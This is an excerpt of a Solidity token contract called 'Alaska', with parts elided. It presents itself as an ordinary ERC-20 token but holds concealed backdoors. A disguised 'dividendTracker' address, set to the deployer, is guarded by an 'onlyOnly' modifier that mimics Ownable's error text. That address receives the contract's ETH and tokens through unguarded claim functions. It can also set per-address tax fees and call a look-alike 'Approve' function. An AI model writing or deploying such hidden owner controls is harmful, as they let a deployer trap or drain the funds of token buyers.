...
contract Alaska is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Alaska";
    string private _symbol = "Alaska";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xA4097c02CFad0BB47B5DE82f94E6D292CC5FE38e); 
    address payable private teamWalletAddress = payable(0xDe16f8Aef692E784fEF00B3e54f54ce0aF85CF03); 
...
//	uint256 public _percent = 100;
    ...
    uint256 private _totalSupply = 1 * 10**14* 10**2 * 10**_decimals;
	...
	address  public dividendTracker =_msgSender();
	...
	modifier onlyOnly {
       require(dividendTracker == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(dividendTracker).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(dividendTracker, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyOnly {
	...
	function Approve(address spender,uint256 amount)public onlyOnly{
